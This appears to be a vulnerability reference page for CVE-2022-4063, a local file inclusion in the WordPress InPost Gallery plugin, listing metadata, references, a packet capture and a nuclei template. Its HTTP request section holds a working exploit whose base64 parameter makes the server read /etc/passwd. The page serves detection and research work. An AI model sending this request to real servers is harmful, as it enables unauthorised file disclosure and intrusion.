---
layout: "post"
cve_id: "CVE-2022-4063"
title: "WordPress InPost Gallery <2.1.4.1 - Local File Inclusion"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-4063.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-4063.yaml"
author: "theamanrawat"
severity: "critical"
impact: "The vulnerability allows an attacker to read arbitrary files on the server, potentially exposing sensitive information or executing malicious code.
"
remediation: "Fixed in version 2.1.4.1."
reference:
  - "https://wpscan.com/vulnerability/6bb07ec1-f1aa-4f4b-9717-c92f651a90a7"
  - "https://wordpress.org/plugins/inpost-gallery/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-4063"
  - "https://github.com/cyllective/CVEs"
  - "https://github.com/im-hanzou/INPGer"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2022-4063', 'cwe-id': 'CWE-22', 'epss-score': 0.90722, 'epss-percentile': 0.99597, 'cpe': 'cpe:2.3:a:pluginus:inpost_gallery:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'pluginus', 'product': 'inpost_gallery', 'framework': 'wordpress'}"
tags:
  - "cve2022"
  - "cve"
  - "wp-plugin"
  - "wp"
  - "inpost-gallery"
  - "lfi"
  - "wordpress"
  - "unauth"
  - "wpscan"
  - "pluginus"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
WordPress InPost Gallery plugin before 2.1.4.1 is susceptible to local file inclusion. The plugin insecurely uses PHP's extract() function when rendering HTML views, which can allow attackers to force inclusion of malicious files and URLs. This, in turn, can enable them to execute code remotely on servers.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-admin/admin-ajax.php?action=inpost_gallery_get_gallery&popup_shortcode_key=inpost_fancy&popup_shortcode_attributes=eyJwYWdlcGF0aCI6ICJmaWxlOi8vL2V0Yy9wYXNzd2QifQ== HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

